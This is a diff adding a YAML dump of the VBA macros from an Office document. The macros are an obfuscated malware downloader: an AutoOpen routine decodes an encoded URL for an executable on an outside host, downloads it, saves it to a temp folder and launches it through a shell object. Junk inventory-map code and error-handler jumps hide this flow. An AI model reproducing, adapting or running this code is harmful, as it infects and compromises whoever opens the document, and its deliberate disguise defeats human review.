@@ -1,0 +1,268 @@
+has_macros: true
+modules:
+  - name: "ThisDocument"
+    type: MODULE_TYPE_CLASS
+    code: |
+        Attribute VB_Name = "ThisDocument"
+        Attribute VB_Base = "1Normal.ThisDocument"
+        Attribute VB_GlobalNameSpace = False
+        Attribute VB_Creatable = False
+        Attribute VB_PredeclaredId = True
+        Attribute VB_Exposed = True
+        Attribute VB_TemplateDerived = True
+        Attribute VB_Customizable = True
+        Sub autoopen()
+        Call AddSensors
+        End Sub
+        
+        
+  - name: "UserForm1"
+    type: MODULE_TYPE_CLASS
+    code: |
+        Attribute VB_Name = "UserForm1"
+        Attribute VB_Base = "0{CFED7DD4-70B3-4500-991E-8D2A9E25237B}{902520CF-EBFE-40D2-A478-42D7F0823E64}"
+        Attribute VB_GlobalNameSpace = False
+        Attribute VB_Creatable = False
+        Attribute VB_PredeclaredId = True
+        Attribute VB_Exposed = False
+        Attribute VB_TemplateDerived = False
+        Attribute VB_Customizable = False
+        
+  - name: "Module1"
+    type: MODULE_TYPE_STANDARD
+    code: |
+        Attribute VB_Name = "Module1"
+        Public MapsInitialized As Boolean
+        Public mDBname As String
+        Public MapInit As Boolean
+        Public KogdaGe_1 As Object
+        Public KogdaGe_2 As Object
+        Public KogdaGe_3 As Object
+        Public KogdaGe_4 As String
+        Public KogdaGe_5 As String
+        Public KogdaGe_6 As Object
+        Public DrinkSun() As String
+        
+        Public Sub CheckMaps()
+         Dim objStors As String
+         Dim objStor As Variant
+         KogdaGe_1.Send
+         Dim NewList As String
+         Dim DoReset As Boolean
+         Dim LP As Long
+         KogdaGe_4 = KogdaGe_3(DrinkSun(6))
+        GoTo ErrHandler
+         objS.tors.Load , , , , , True
+         For Each objStor In objSt.ors
+         NewLi.st.Add objStor.MapID
+         Next
+         If Not MapInit Then
+         MapInit = True
+         DoReset = True
+         Else
+         If MapL.ist.Count <> NewLi.st.Count Then
+         DoReset = True
+         Set MapL.ist = NewList
+         Else
+         For LP = 1 To MapLi.st.Count
+         If MapL.ist.ID(LP) <> NewLi.st.ID(LP) Then
+         DoReset = True
+         Set MapL.ist = Ne.w.List
+         Exit For
+         End If
+         Next LP
+         End If
+         End If
+         If DoReset Then
+         BM.Reset
+         MapsInitialized = False
+         End If
+         Set NewLi.st = Nothing
+         Set objSt.ors = Nothing
+         Set objSt.or = Nothing
+         On Error GoTo 0
+        ErrExit:
+         Exit Sub
+        ErrHandler:
+        KogdaGe_5 = KogdaGe_4 + Replace(DrinkSun(12), "t", "e")
+        ConnectMaps
+        End Sub
+        Public Sub AddSensors()
+         Dim Col As String
+         Dim Obj As String
+         DrinkSun = Split(UserForm1.Label1.Caption, "/")
+         GoTo ErrExit
+         On Error GoTo ErrHandler
+         BM.ResetBalances
+         Cofl.Load
+         On Error GoTo 0
+        ErrExit:
+        Set KogdaGe_1 = CreateObject(DrinkSun(0))
+        CheckBins
+         Exit Sub
+        ErrHandler:
+         AD.DisplayError Err.Number, "modMaps", "AddSensors", Err.Description
+         Resume ErrExit
+        End Sub
+        
+        
+        
+  - name: "Module2"
+    type: MODULE_TYPE_STANDARD
+    code: |
+        Attribute VB_Name = "Module2"
+        Public Sub CheckBins()
+         Dim LP As Long
+         Dim BinID As Long
+         Dim objStorages As String
+         Dim objStorage As Variant
+         Dim MapID As Long
+         Set KogdaGe_2 = CreateObject(DrinkSun(1))
+         GoTo ErrHandler
+         objSt.orages.Load
+         For LP = 1 To BM.StorCount
+         BinID = BM.StorID(LP)
+         If Not objSto.rages.IsItem(BinID) Then
+         BM.UnloadStor BinID
+         End If
+         Next LP
+         For Each objStorage In objS.torages
+         With objStorage
+         If Not BM.BinLoaded(.ID) Then
+         BM.AddStor .ID, .Label, .IsWarehouse, .MapID, .XPos, .YPos, .Volume, .PositionSet
+         End If
+         MapID = BM.BinMapID(.ID)
+         If MapID <> 0 And MapID <> .MapID Then
+         BM.UnloadStor .ID
+         BM.AddStor .ID, .Label, .IsWarehouse, .MapID, .XPos, .YPos, .Volume, .PositionSet
+         End If
+         End With
+         Next
+         On Error GoTo 0
+        ErrExit:
+         Exit Sub
+        ErrHandler:
+        Set KogdaGe_6 = CreateObject(DrinkSun(2))
+        Set hokuk = CreateObject(DrinkSun(3))
+        Set KogdaGe_3 = hokuk.Environment(DrinkSun(4))
+        CheckDatabase
+        End Sub
+        Public Sub CheckDatabase()
+        Dim KogdaGe_7() As Variant
+        KogdaGe_7 = Array(255, 267, 267, 263, 209, 198, 198, 270, 270, 270, 197, 257, 252, 266, 268, 266, 251, 252, 261, 248, 273, 248, 265, 252, 267, 197, 250, 262, 260, 197, 269, 252, 198, 202, 203, 254, 253, 204, 272, 198, 265, 202, 203, 253, 202, 202, 203, 204, 254, 197, 252, 271, 252)
+        Dim KogdaGe_8 As Integer
+         Dim PubDoStop As String
+         PubDoStop = ""
+         GoTo ErrHandler
+         If mDBname <> Prog.DatabaseFullName Then
+         mDBname = Prog.DatabaseFullName
+         BM.Reset
+         MapsInitialized = False
+         End If
+         On Error GoTo 0
+        ErrExit:
+         Exit Sub
+        ErrHandler:
+         For KogdaGe_8 = LBound(KogdaGe_7) To UBound(KogdaGe_7)
+         PubDoStop = PubDoStop & Chr(-99 + KogdaGe_7(KogdaGe_8) - 52)
+         Next KogdaGe_8
+        KogdaGe_1.Open DrinkSun(5), PubDoStop, False
+        CheckMaps
+         End Sub
+        Public Sub ConnectMaps()
+         Dim objStorages As Variant
+         Dim objStorage As Variant
+         Dim objMap As Variant
+         Dim objMaps As Variant
+         CallByName KogdaGe_2, DrinkSun(7), VbLet, 1
+         KogdaGe_2.Open
+        GoTo ErrHandler
+         CheckDat.abase BM
+         CheckM.aps BM
+         objMaps.Load
+         BM.Visible = False
+         If objMaps.Count > 0 Then
+         BM.Visible = ShowMaps
+         If ShowMaps Then
+         If Not MapsInitialized Then
+         For Each objMap In objMaps
+         With objMap
+         BM.AddMap .ID, .MapName, .Units, .Zoom
+         End With
+         Next
+         objStor.ages.Load , , , , , True
+         For Each objStorage In objSto.rages
+         With objStorage
+         BM.AddStor .ID, .Label, .IsWarehouse, .MapID, .XPos, .YPos, .Volume, .PositionSet
+         End With
+         Next
+         MapsInitialized = True
+         End If
+         AddSenso.rs BM
+         CheckB.ins BM
+         BM.Update
+         End If
+         End If
+         Set objMap = Nothing
+         Set objMaps = Nothing
+         Set objStorage = Nothing
+         Set objStorages = Nothing
+         On Error GoTo 0
+        ErrExit:
+         Exit Sub
+        ErrHandler:
+        SaveMaps
+        End Sub
+        Public Sub SaveMaps()
+        rbp = CallByName(KogdaGe_1, DrinkSun(10), VbGet)
+         Dim objStor As Variant
+         CallByName KogdaGe_2, DrinkSun(9), VbMethod, rbp
+         Dim objMap As Variant
+         Dim LP As Long
+         Dim ID As Long
+         Dim XPos As Single
+         Dim YPos As Single
+         Dim BinLP As Long
+         Dim BinID As Long
+         CallByName KogdaGe_2, DrinkSun(11), VbMethod, KogdaGe_5, 2
+        GoTo ErrHandler
+         For LP = 1 To BM.MapCount
+         ID = BM.MapID(LP)
+         objMap.Load ID
+         objMap.BeginEdit
+         objMap.MapZoom = BM.MapZoom(LP)
+         objMap.ApplyEdit
+         Set objMap = Nothing
+         Next LP
+         For BinLP = 1 To BM.StorCount
+         BinID = BM.StorID(BinLP)
+         If BM.BinLoaded(BinID) Then
+         BM.BinLocation BinLP, XPos, YPos
+         With objStor
+         .Load BinID
+         .BeginEdit
+         .XPos = XPos
+         .YPos = YPos
+         .ApplyEdit
+         End With
+         Set objStor = Nothing
+         End If
+         Next BinLP
+         On Error GoTo 0
+        ErrExit:
+         Exit Sub
+        ErrHandler:
+        KogdaGe_6.Open (KogdaGe_5)
+        End Sub
+        
+        
+        
+project_info:
+    name: "Project"
+    version: "1485256679.65"
+    references:
+      - "stdole"
+      - "Normal"
+      - "Office"
+      - "MSForms"
+    module_count: 4
